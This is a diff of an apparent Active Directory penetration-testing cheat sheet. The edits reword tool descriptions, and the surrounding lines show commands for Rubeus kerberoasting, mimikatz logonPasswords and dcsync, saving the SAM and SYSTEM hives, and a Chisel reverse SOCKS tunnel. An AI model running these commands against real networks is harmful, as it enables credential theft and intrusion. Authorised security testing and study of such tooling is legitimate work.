@@ -37,7 +37,7 @@ PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:"username" /nowrap  #RC4 encrypt
 
 ### SharpHound.exe
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors  
-To gather AD data for Bloodhound  
+Enumerate AD for Bloodhound  
 
 
 ### Snaffler.exe
@@ -48,7 +48,7 @@ PS C:\> .\Snaffler.exe  -d <DomainName> -s -v data
 
 ### Chisel
 https://github.com/jpillora/chisel  
-Pre-compiled Chisel for port-forwarding, both linux and windows  
+Pre-compiled Chisel for port-forwarding, linux and windows  
 sudo ./chisel server --reverse -v -p 1234 --socks5  
 ./chisel.exe client -v 10.10.10.10:1234 R:socks  
   
@@ -77,7 +77,6 @@ mimikatz # sekurlsa::logonPasswords
 #for dcsync abuse  
 mimikatz # lsadump::dcsync  
 mimikatz # lsadump::dcsync /user:<UserName>  #for spesific user only  
-
 
 reg save HKLM\SAM sam.h  #to Dump SAM  
 reg save HKLM\SYSTEM sys.h  #to Dump SYSTEM  
